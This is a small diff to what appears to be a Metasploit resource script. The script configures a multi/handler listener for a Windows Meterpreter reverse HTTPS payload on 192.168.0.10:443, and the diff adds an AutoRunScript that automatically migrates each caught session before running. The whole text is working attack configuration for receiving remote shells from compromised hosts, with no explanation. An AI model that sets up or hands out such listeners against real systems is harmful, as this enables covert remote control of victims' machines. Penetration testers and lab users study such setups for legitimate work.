@@ -2,4 +2,5 @@ use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
 set lhost 192.168.0.10
 set lport 443
+set AutoRunScript /home/kali/auto_migrate.rc
 run
